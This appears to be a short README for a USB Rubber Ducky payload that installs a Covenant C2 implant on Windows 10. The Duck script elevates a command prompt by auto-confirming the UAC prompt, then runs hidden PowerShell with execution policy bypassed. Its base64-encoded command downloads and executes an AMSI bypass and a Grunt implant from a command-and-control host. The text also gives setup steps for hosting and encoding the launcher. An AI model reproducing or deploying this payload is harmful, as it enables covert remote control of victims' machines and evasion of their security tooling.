﻿# RubberDuck-loads

## Covenant c2 Powershell

Running Microsoft Windows 10 - 10.0.19002.0

Host the PowerShell Launcher on Covenant, grab the URL and drop it into the PowerShell, include an AmsiBypass (Credits to https://rastamouse.me/) and then encode the payload and drop it on the duck.


### Duck payload:
```
DELAY 750  
GUI r 
DELAY 1000 
STRING powershell Start-Process Cmd.exe -Verb runAs 
ENTER
DELAY 750  
ALT y
ENTER
DELAY 750
STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Sta -NoProfile -encodedCommand aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAG0AeQBjADIALgBuAGUAdAAvAGEAbQBzAGkALgB0AHgAdAAnACkAKQA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBtAHkAYwAyAC4AbgBlAHQALwBnAHIAdQBuAHQALgB0AHgAdAAnACkAKQA7AA==
ENTER
```

![alt text](Grunt-RubberDuck.PNG)
